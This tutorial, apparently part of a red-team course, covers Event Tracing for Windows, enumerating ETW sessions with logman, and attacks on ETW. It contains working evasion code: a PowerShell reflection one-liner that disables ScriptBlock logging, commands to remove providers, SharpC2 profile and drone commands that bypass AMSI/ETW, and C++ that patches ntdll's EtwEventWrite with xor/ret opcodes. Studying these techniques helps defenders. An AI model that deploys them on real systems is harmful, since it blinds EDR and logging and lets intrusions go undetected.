Prerequisite:

- Knowledge of low-level application programming.
- Knowledge of Windows architecture

# What is ETW ? 


ETW  (Event Tracing for Windows) ETW will allow you to monitor events on a programmed application by storing user or kernel events in logs. It is possible to view these logs later or in real time. ETW is an integral part of the Windows Performance Toolkit (WPT), WPT is what contains most of the monitoring tools on Windows. ETW is also used for EDR deployment.

When a ETW Session is opened to listen events, all the events are stored in a file called Event Trace Log (ETL)

ETW API .NET : https://www.nuget.org/packages/Microsoft.Windows.EventTracing.Processing.All

ETW uses WPA and WPR to manage and present the events in a clean way. WPA (Windows Performance Analyzer) will consult the ETL files produced by the active applications (Provider) of an ETW session to create graphs and tables, so that the rendering is clean.

WPR (Windows Performance Recorder) acts as a session controller, it will start and stop the session and can select the ETW events to be recorded. WPRP files can be created to create custom profiles, in order to start ETW sessions by following very precise events.


![image](https://user-images.githubusercontent.com/75935486/153571218-c549be1e-e4e0-42f2-86d2-a65007d71707.png)


[Creating Recording Profiles | Microsoft Documents](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/authoring-recording-profiles)
[WPT Getting Started | Microsoft Documents](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/wpt-getting-started-portal)
[Event Tracing - Win32 apps | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal)


### ETW Logman Enumeration :

Logman is a tool that allows windows users to see which ETW sessions are active as well as the providers of its logs.

Here you can see all active powershell providers like AMSI:

```powershell
PS> tasklist | findstr powershell
PS> logman query providers -pid <pid>
PS> logman query providers # here we will list all providers without exceptions
```
![image](https://user-images.githubusercontent.com/75935486/153571271-52625701-bb5a-49d3-b703-f39050f60286.png)

if you want to delete all active providers from the AutoLogger:
```powershell
PS> Remove-EtwTraceProvider -AutologgerName EventLog-Application -Guid {GUID}
```
An AutoLogger is a Trace Session that records provider events in kernel mode and user mode.

disable ETW (logging ScriptBlock) :
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

to list all ETW sessions, run this command.
```powershell
PS> logman -ets
```

###### EVENT_ENABLE_PROPERTY_IGNORE_KEYWORD_0 :

```powershell
Set-EtwTraceProvider -Guid {GUID} -AutologgerName 'EventLog-Application' -Property 0x11
```

this allows not to display the events having the value KEYWORD 0

#### Attacks against ETW : 

different methods of attack against ETW :

![image](https://user-images.githubusercontent.com/75935486/153571308-01ef3870-b6f4-4248-8c6e-f0b5ed011881.png)

- __*red*__ : shows attacks on ETW from inside a malicious process.
- __*Light blue*__ : shows attacks on ETW by modifying environment variables, registry and files
- __*Orange*__ : shows attacks against ETW providers in user mode
- __*Dark blue*__ : shows attacks against ETW providers in kernel mode
- __*Violet*__ : shows attacks on ETW sessions.

The total number of possible attacks against ETW would be 36 but in this course we will only see the red, orange and light blue attacks.
Some offensive operations (Red Team) have used attack techniques against ETW, for example APT42 has disabled ETW, APT Slingshot has renamed ETLs to leave no trace and the lockerGoga ransomware has disabled ETW to bypass host-based sensors like HIDS, HIPS...


Some C2's have implemented ETW bypass functions, for example SharpC2 :
```apm
[drones] > interact a47153bd55 
[a47153bd55] > help 
Name           Description 
----           ----------- 
abort            Abort a running task 
back             Go back to the previous screen 
bypass           Set a directive to bypass AMSI/ETW on tasks 
cat              Read a file as text 
cd               Change working directory 
execute-assembly Execute a .NET assembly 
exit             Exit this Drone
```
once you have compromised the victim, you can interact with the drone, *bypass* Tells the drone whether or not it should attempt to bypass AMSI and/or ETW when executing post-exp commands. The drone uses the built-in MinHook.NET library to connect `amsi.dll!AmsiScanBuffer` and `ntdll.dll!EtwEventWrite`.

###### Post-Exploitation Custom C2Profile, Bypass AMSI/ETW :

SharpC2 uses C2 profiles to customize certain actions. Profiles are in YAML format and have 3 key/objects, Stage, PostExploitation and ProcessInjection.
```yaml
Stage: 
   SleepTime: 5 
   SleepJitter: 0 
   DllExport: Execute 
   SendStandardApi: true 
PostExploitation: 
   BypassAmsi: false 
   BypassEtw: false 
   SpawnTo: C:\Windows\System32\notepad.exe 
   AppDomain: SharpC2 
ProcessInjection: 
   Allocation: NtWriteVirtualMemory 
   Execution: RtlCreateUserThread
```

the **BypassAmsi/BypassEtw** values tell the drone whether or not it should attempt to bypass the AMSI and ETW during post-ex tasks.
can also be used at runtime with the bypass command.


###### ETW EtwEventWrite Patching :
![image](https://user-images.githubusercontent.com/75935486/153571358-b1ec7fd7-d66f-4e0e-8afc-1c137b0536b6.png)

we can do what we call Function patching with the RET instruction.

This code allows to disable the ETW event tracking in user-mode,
NTDLL is the most basic layer of User-Mode. NTDLL includes a large list of functions used for the proper functioning of Windows in different versions of microprocessor (x86, x64, wow64...). NTDLL includes the `EtwEventWrite` function.

The EtwEventWrite function is responsible for writing events to a session. Since *EtwEventWrite* works in user-mode, an attacker can bypass ETW. the function normally ends with `ret 0x14`.

since Event Tracking ends with `EtwEventWrite` to write events, if you rewrite the same assembly code at the beginning of the `EtwEventWrite()` function, no events will be recorded.

![image](https://user-images.githubusercontent.com/75935486/153571624-28b40c4b-9cde-4110-bfc2-676d3a6f3c86.png)

in this code above we get the address of the *EtwEventWrite* function from NTDLL and we modify the permissions of this memory segment with VirtualProtect() by defining the perms RWX (Read Write Exec)
and memcpy will be used to copy the opcode for a return to the buffer.


![image](https://user-images.githubusercontent.com/75935486/153571513-3b193861-d3f7-428e-995b-cc5af6045719.png)

(64 bits)
you can see that the return value is `c3` (\xc3) and so `x48\x33\xc0` is the application of *XOR* on the *rax* register for all clear.


in the other opcode sequence (32 bits), `x33\xc0\xc2\x14\x00`, 
![image](https://user-images.githubusercontent.com/75935486/153571571-a39a59ee-68bb-4985-9b49-bf8bda2bac61.png)

you can see that the return value is c21400 which is `xc2\x14\x0` for `ret 14h` and `x33\xc0` for *xor* the *EAX* register

we can also use the preprocessors `#ifdef`, `#else`, `#endif` if we want to adapt the opcode according to the versions.
```cpp
#ifdef _WIN64
        memcpy(addr, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif
```

results:

![image](https://user-images.githubusercontent.com/75935486/153571594-e1df4d49-d7af-4423-87fe-93c0f1f24fbf.png)
